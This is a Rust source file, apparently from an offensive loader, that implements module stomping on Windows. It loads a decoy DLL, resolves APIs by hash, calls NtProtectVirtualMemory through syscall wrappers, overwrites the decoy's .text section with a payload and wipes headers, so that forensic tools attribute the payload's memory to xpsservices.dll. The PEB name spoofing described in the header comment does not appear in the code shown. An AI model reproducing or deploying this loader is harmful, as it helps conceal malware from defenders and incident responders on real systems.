// stomp.rs — Module stomping + PEB name spoofing
//
// Strategy:
//   1. Load a legitimate decoy DLL (xpsservices.dll) into memory via LdrLoadDll
//   2. Find the decoy's .text section
//   3. Copy payload shellcode/PE into that section (VirtualProtect RX->RW->RX)
//   4. Wipe PE headers of the stomped region
//   5. Patch PEB LDR_DATA_TABLE_ENTRY for our loaded module:
//      - FullDllName → decoy path
//      - BaseDllName → decoy name
//   Forensic tools see xpsservices.dll backing the memory, not our payload.

#![allow(non_snake_case, dead_code)]

use core::{ffi::c_void, ptr::null_mut, mem::size_of};
use crate::defs::*;
use crate::syscall::{nt_protect_virtual_memory, get_proc_from_peb, resolve_ssn, do_syscall};
use crate::utils::djb2;

pub struct StompedRegion {
    pub text_base: *mut u8,
    pub text_size: usize,
    pub entry:     *mut u8,
}

unsafe impl Send for StompedRegion {}
unsafe impl Sync for StompedRegion {}

const PE_HEADER_SIZE: usize = 0x1000;

unsafe fn load_decoy(name: *const UNICODE_STRING) -> Option<*mut u8> {
    let ntdll_h    = djb2(b"ntdll.dll");
    let ldr_h      = djb2(b"LdrLoadDll");
    let ldr_load   = get_proc_from_peb(ntdll_h, ldr_h)?;
    let ldr_fn: unsafe extern "system" fn(*const u16, *const u32, *const UNICODE_STRING, *mut *mut u8) -> NTSTATUS
        = core::mem::transmute(ldr_load);
    let mut base: *mut u8 = null_mut();
    let st = ldr_fn(null_mut(), null_mut(), name, &mut base);
    if NT_SUCCESS(st) && !base.is_null() { Some(base) } else { None }
}

unsafe fn find_text_section(base: *const u8) -> Option<(*mut u8, usize)> {
    if (base as *const u16).read_unaligned() != IMAGE_DOS_SIGNATURE { return None; }
    let e_lfanew = (base.add(0x3C) as *const u32).read_unaligned() as usize;
    let nt       = base.add(e_lfanew);
    let fh       = nt.add(4) as *const IMAGE_FILE_HEADER;
    let opt_sz   = (*fh).SizeOfOptionalHeader as usize;
    let n        = (*fh).NumberOfSections as usize;
    let sects    = nt.add(4 + size_of::<IMAGE_FILE_HEADER>() + opt_sz)
                     as *const IMAGE_SECTION_HEADER;
    let text_name= b".text\0\0\0";
    for i in 0..n {
        let s = &*sects.add(i);
        if &s.Name == text_name {
            let sz = if s.VirtualSize > 0 { s.VirtualSize } else { s.SizeOfRawData } as usize;
            return Some((base.add(s.VirtualAddress as usize) as *mut u8, sz));
        }
    }
    None
}

const DECOY_NAME_W: &[u16] = &[
    b'x' as u16, b'p' as u16, b's' as u16, b's' as u16, b'e' as u16,
    b'r' as u16, b'v' as u16, b'i' as u16, b'c' as u16, b'e' as u16,
    b's' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
];

pub unsafe fn stomp(
    _decoy_dll:  &[u16],
    _spoof_name: &[u16],
    _spoof_path: &[u16],
    payload:     &[u8],
) -> Option<StompedRegion> {
    // Build UNICODE_STRING for decoy
    let decoy_us = UNICODE_STRING {
        Length:        (DECOY_NAME_W.len() * 2) as u16,
        MaximumLength: (DECOY_NAME_W.len() * 2) as u16,
        Buffer:        DECOY_NAME_W.as_ptr() as *mut u16,
    };

    // Load decoy DLL
    let decoy_base = load_decoy(&decoy_us)?;

    // Find .text section
    let (text_ptr, text_size) = find_text_section(decoy_base as *const u8)?;

    if payload.len() > text_size {
        return None; // payload too large for decoy .text
    }

    let process: HANDLE = -1isize as HANDLE;
    let mut base  = text_ptr as PVOID;
    let mut sz: SIZE_T = payload.len();
    let mut old: u32 = 0;

    // RW
    nt_protect_virtual_memory(process, &mut base, &mut sz, PAGE_READWRITE, &mut old).ok()?;

    // Wipe PE headers
    let hdr_wipe = PE_HEADER_SIZE.min(payload.len());
    core::ptr::write_bytes(decoy_base, 0u8, hdr_wipe);

    // Copy payload into .text
    core::ptr::copy_nonoverlapping(payload.as_ptr(), text_ptr, payload.len());

    // Restore RX
    let mut dummy: u32 = 0;
    nt_protect_virtual_memory(process, &mut base, &mut sz, PAGE_EXECUTE_READ, &mut dummy).ok();

    // Entry point = start of stomped .text
    Some(StompedRegion {
        text_base: text_ptr,
        text_size,
        entry: text_ptr,
    })
}
